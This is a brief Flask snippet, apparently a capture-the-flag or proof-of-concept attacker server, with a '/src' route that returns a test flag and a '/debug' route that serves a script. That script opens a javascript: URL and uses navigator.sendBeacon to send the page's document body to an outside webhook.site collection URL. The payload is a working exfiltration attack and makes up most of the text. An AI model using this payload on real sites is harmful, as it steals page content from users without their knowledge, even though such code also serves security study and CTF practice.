...
@app.route('/src')
def source():
    return "<body>flag\{test\}</body>"

@app.route('/debug')
def debug():
    return "<script>window.open(`javascript:navigator.sendBeacon('https://webhook.site/9a4c3b6f-128e-4744-bb22-3aded8fce97f',document.body)`,'poc1')</script>"
